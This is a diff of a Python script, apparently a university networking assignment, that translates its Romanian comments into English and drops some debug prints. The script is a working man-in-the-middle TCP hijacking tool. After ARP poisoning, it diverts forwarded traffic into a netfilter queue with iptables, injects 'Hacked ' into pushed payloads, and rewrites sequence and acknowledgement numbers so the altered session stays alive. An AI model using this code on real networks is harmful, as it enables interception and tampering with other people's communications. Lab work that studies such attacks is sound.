@@ -1,5 +1,5 @@
-# BIBLIOGRAFIE 
-# pentru dictionarele de seq si ack https://github.com/DariusBuhai/FMI-Unibuc/tree/main/Year%20II/Semester%202/Retele%20de%20calculatoare/Teme/Tema%202/tcp_hijack
+# REFERENCES
+# for the dictionaries SYN and ACK: https://github.com/DariusBuhai/FMI-Unibuc/tree/main/Year%20II/Semester%202/Retele%20de%20calculatoare/Teme/Tema%202/tcp_hijack
 
 import os
 import time
@@ -15,16 +15,15 @@ def detect_and_alter_packet(packet):
     global hacked_seq 
     global hacked_ack
 
-    #ip ia tot pachetul, inclusiv partea de tcp si raw
+    # IP() will include the whole package, TCP and Raw as well
     scapy_packet = IP(packet.get_payload())
 
-    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw): #and (scapy_packet[IP].src == '198.7.0.2' or scapy_packet[IP].src == '172.7.0.2'):
-
-        #print(scapy_packet[IP].show2())
+    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):
 
         F = scapy_packet['TCP'].flags
         IPF = scapy_packet[IP].flags
 
+        # calculate the old & new -- sequence & acknowledgement numbers
         old_seq = scapy_packet['TCP'].seq
         old_ack = scapy_packet['TCP'].ack
         new_seq = hacked_seq[old_seq] if old_seq in hacked_seq.keys() else old_seq
@@ -32,26 +31,26 @@ def detect_and_alter_packet(packet):
 
         msg = scapy_packet[Raw].load
 
-        #PSH - segmentul sa fie trimis la layer-ul de aplicatie cat mai rapid
-        #print('BEFORE', scapy_packet[TCP].seq, ' ', scapy_packet[TCP].ack, scapy_packet[IP].src, '->')
-        if F & 0x08: # DOAR DACA ARE FLAG PUSH, DIN CE VAD DOAR ALEA CONTIN PAYLOAD DATA, DECI PE ALEA VREM SA LE ALTERAM
+        # PSH - the segment will be sent to the layer application the fastest
+        if F & 0x08: 
             msg = scapy.packet.Raw(b'Hacked ' + bytes(scapy_packet[TCP].payload))
         
 
         hacked_seq[old_seq + len(scapy_packet['TCP'].payload)] = new_seq + len(msg)
         hacked_ack[new_seq + len(msg)] = old_seq + len(scapy_packet['TCP'].payload)
 
-        # modificam load-ul pachetului si punem seq si ack noi
+        # modify the load of the packet and 
+        # add the new sequence and acknowledgement number
         scapy_packet[Raw].load = msg
         scapy_packet['TCP'].seq = new_seq
         scapy_packet['TCP'].ack = new_ack
 
-        # stergem checksum pt IP si TCP si scapy le recalculeaza automat
+        # delete the checksum for IP and TCP,
+        # scapy will recalculate them automatically
         del scapy_packet[IP].len
         del scapy_packet[IP].chksum
         del scapy_packet[TCP].chksum
 
-        #print('AFTER', scapy_packet[TCP].seq, ' ', scapy_packet[TCP].ack, scapy_packet[IP].src, '->')
         send(scapy_packet)
 
     else:
@@ -62,12 +61,14 @@ def detect_and_alter_packet(packet):
 print('waitinng for ARP to poison')
 time.sleep(2)
 print("Started to alter packages")
-#se defineste obicectul coada 
+# define the NetfilterQUEUE
 queue = NFQ()
 try:
-    #toate mesajele care trebuiesc forwardate prin routet(middle sub acoperire) vor fi preluate de coada 10
+    # all the messages forwarded through the router( middle undercover)
+    # will be intercepted by the queue
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
-    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
+
+    # bind need to have the same number as the queue --> 10
     queue.bind(10, detect_and_alter_packet)
     queue.run()
 except KeyboardInterrupt:
